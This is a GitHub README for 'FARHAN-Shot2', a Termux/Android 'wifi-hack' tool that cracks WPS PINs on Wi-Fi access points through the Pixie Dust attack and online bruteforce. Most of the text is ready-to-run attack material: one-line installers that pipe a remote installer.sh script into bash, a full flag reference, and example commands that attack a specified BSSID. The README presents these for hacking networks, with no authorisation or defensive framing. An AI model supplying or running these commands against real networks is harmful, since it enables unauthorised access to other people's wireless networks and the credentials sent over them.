[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&pause=1000&random=false&width=435&lines=im-farhan-thanks-for-my-cmd-use)](https://git.io/typing-svg)

### Hola, bienvenid@ **TERMUX** REPO CLEAN FILES.. 
..using  *wifi-hack* by Termux/Android, FARHAN-😫!!
<br><br>
![termuxICO](https://user-images.githubusercontent.com/80227002/112893051-6feceb00-90da-11eb-856d-1fac8f6d169a.png)
<br><br>

### wifi-hack
<p align="center"><img src="https://user-images.githubusercontent.com/75953873/115979290-66309900-a55b-11eb-8259-4b125efc42bb.png"></p>

[![Python 3.5](https://img.shields.io/badge/Python-3.5-yellow.svg)](http://www.python.org/download/)
[![python](https://img.shields.io/badge/python-2.7-brightgreen.svg)](https://www.python.org/downloads/release/python-2714/)
[![OS](https://img.shields.io/badge/Tested%20On-Linux%20%7C%20Android-yellowgreen.svg)](https://termux.com/)


### How to update WifiHack
To check for updates and update, run the following command:
```
(cd FARHAN-Shot2 && git pull)
```

# FARHAN-Shot2_Termux_installer/LINK
```
 https://github.com/Gtajisan/FARHAN-Shot2_Termux_installer
 ```



# Overview
**FARHAN-Shot2** performs [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack) without having to switch to monitor mode.
# Features
 - [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack);
 - integrated [3WiFi offline WPS PIN generator](https://3wifi.stascorp.com/wpspin);
 - [online WPS bruteforce](https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf);
 - Wi-Fi scanner with highlighting based on iw;
# Requirements
 - Python 3.6 and above;
 - [Wpa supplicant](https://www.w1.fi/wpa_supplicant/);
 - [Pixiewps](https://github.com/wiire-a/pixiewps);
 - [iw](https://wireless.wiki.kernel.org/en/users/documentation/iw).

Please note that root access is required.  

### Installation one line:

```bash
apt update && apt upgrade && pkg install tsu && pkg install python && pkg install git && pkg install -y root-repo && pkg install -y git tsu python wpa-supplicant pixiewps iw openssl && termux-setup-storage && curl -sSf https://raw.githubusercontent.com/gtajisan/FARHAN-Shot2_Termux_installer/master/installer.sh | bash && git clone --depth 1 https://github.com/gtajisan/FARHAN-Shot2 FARHAN-Shot2 && sudo python FARHAN-Shot2/FARHAN-Shot2.py -i wlan0 --iface-down -K
```


## [Termux](https://termux.com/)
Please note that root access is required.  

### Hack WIfi Using Termux! (Requires Root)
<p align="center"><img src="https://imgtr.ee/image/EbAMl"></



#### Using installer
 ```
 curl -sSf https://raw.githubusercontent.com/gtajisan/FARHAN-Shot2_Termux_installer/master/installer.sh | bash
 ```
#### Manually
**Installing requirements**
 ```
pkg update
pkg upgrade
pkg install tsu
pkg install python
pkg install git
pkg install -y root-repo
pkg install -y git tsu python wpa-supplicant pixiewps iw openssl
termux-setup-storage
 ```
**Getting FARHAN-Shot2**
 ```
 git clone --depth 1 https://github.com/gtajisan/FARHAN-Shot2 FARHAN-Shot2
 ```
#### Running
 ```
 sudo python FARHAN-Shot2/FARHAN-Shot2.py -i wlan0 -K
 ```
## [Termux](https://termux.com/)


# Usage
```
 FARHAN-Shot2.py <arguments>
 Required arguments:
     -i, --interface=<wlan0>  : Name of the interface to use

 Optional arguments:
     -b, --bssid=<mac>        : BSSID of the target AP
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
     -B, --bruteforce         : Run online bruteforce attack
     --push-button-connect    : Run WPS push button connection

 Advanced arguments:
     -d, --delay=<n>          : Set the delay between pin attempts [0]
     -w, --write              : Write AP credentials to the file on success
     -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
     -X, --show-pixie-cmd     : Alway print Pixiewps command
     --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
     --iface-down             : Down network interface when the work is finished
     -l, --loop               : Run in a loop
     -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
     --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                                (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
     -v, --verbose            : Verbose output
 ```

## Usage examples
Start Pixie Dust attack on a specified BSSID:
 ```
 sudo python3 FARHAN-Shot2.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
 ```
Show avaliable networks and start Pixie Dust attack on a specified network:
 ```
 sudo python3 FARHAN-Shot2.py -i wlan0 -K
 ```
Launch online WPS bruteforce with the specified first half of the PIN:
 ```
 sudo python3 FARHAN-Shot2.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
 ```
 Start WPS push button connection:s
 ```
 sudo python3 FARHAN-Shot2.py -i wlan0 --pbc
 ```
## Troubleshooting
#### "RTNETLINK answers: Operation not possible due to RF-kill"
 Just run:
```sudo rfkill unblock wifi```
#### "Device or resource busy (-16)"
 Try disabling Wi-Fi in the system settings and kill the Network manager. Alternatively, you can try running FARHAN-Shot2 with ```--iface-down``` argument.
#### The wlan0 interface disappears when Wi-Fi is disabled on Android devices with MediaTek SoC
 Try running FARHAN-Shot2 with the `--mtk-wifi` flag to initialize Wi-Fi device driver.
# Acknowledgements
## Special Thanks
* `rofl0r` for initial implementation;
* `Monohrom` for testing, help in catching bugs, some ideas;
* `Wiire` for developing Pixiewps.
* binod-xd` for inspire.
